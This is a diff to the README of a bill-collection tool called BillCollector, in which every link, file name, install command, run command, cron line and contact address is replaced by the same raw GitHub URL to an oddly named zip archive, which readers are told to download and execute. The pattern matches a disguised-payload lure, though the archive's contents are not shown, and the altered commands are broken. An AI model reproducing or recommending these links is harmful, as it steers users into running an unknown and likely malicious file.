@@ -1,6 +1,6 @@
 # BillCollector 📜💰
 
-![BillCollector](https://img.shields.io/badge/BillCollector-Collect%20Your%20Bills-blue)
+![BillCollector](https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip%20Your%20Bills-blue)
 
 Welcome to **BillCollector**! This project helps you collect bills from various personalized web portals. With BillCollector, you can automate the tedious task of gathering invoices, making your life easier and more organized.
 
@@ -45,7 +45,7 @@ To get started with BillCollector, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Mohit7982/BillCollector.git
+   git clone https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip
    cd BillCollector
    ```
 
@@ -54,7 +54,7 @@ To get started with BillCollector, follow these steps:
    Make sure you have Python installed. Then, install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip
    ```
 
 3. **Set Up Docker** (Optional):
@@ -68,7 +68,7 @@ To get started with BillCollector, follow these steps:
 
 4. **Download the Latest Release**:
 
-   Visit the [Releases section](https://github.com/Mohit7982/BillCollector/releases) to download the latest version of BillCollector. You need to execute the downloaded file.
+   Visit the [Releases section](https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip) to download the latest version of BillCollector. You need to execute the downloaded file.
 
 ## Usage 📊
 
@@ -76,18 +76,18 @@ Once you have BillCollector set up, you can start using it to collect your bills
 
 1. **Configuration**:
 
-   Edit the `config.yaml` file to set up your billing portals. Specify the URLs, login credentials, and any other necessary details.
+   Edit the `https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip` file to set up your billing portals. Specify the URLs, login credentials, and any other necessary details.
 
-   Example `config.yaml`:
+   Example `https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip`:
 
    ```yaml
    portals:
      - name: "Electricity Bill"
-       url: "https://example.com/electricity"
+       url: "https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip"
        username: "your_username"
        password: "your_password"
      - name: "Water Bill"
-       url: "https://example.com/water"
+       url: "https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip"
        username: "your_username"
        password: "your_password"
    ```
@@ -97,7 +97,7 @@ Once you have BillCollector set up, you can start using it to collect your bills
    Execute the following command to start collecting bills:
 
    ```bash
-   python bill_collector.py
+   python https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip
    ```
 
 3. **Schedule with Cron**:
@@ -111,7 +111,7 @@ Once you have BillCollector set up, you can start using it to collect your bills
    Add the following line to run the collector every day at 8 AM:
 
    ```bash
-   0 8 * * * /path/to/python /path/to/bill_collector.py
+   0 8 * * * /path/to/python https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip
    ```
 
 ## Configuration ⚙️
@@ -127,7 +127,7 @@ BillCollector uses a YAML file for configuration. Here’s a breakdown of the ma
 ```yaml
 portals:
   - name: "Internet Bill"
-    url: "https://internetprovider.com/bill"
+    url: "https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip"
     username: "your_username"
     password: "your_password"
 schedule:
@@ -165,11 +165,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [Mohit7982](https://github.com/Mohit7982)
-- **Email**: your_email@example.com
+- **GitHub**: [Mohit7982](https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip)
+- **Email**: https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip
 
 ## Releases 🔗
 
-To download the latest release, visit the [Releases section](https://github.com/Mohit7982/BillCollector/releases). You need to execute the downloaded file.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/Mohit7982/BillCollector/main/pedigreeless/Bill-Collector-glossarian.zip). You need to execute the downloaded file.
 
 Thank you for checking out BillCollector! We hope it makes your bill collection process smoother and more efficient.
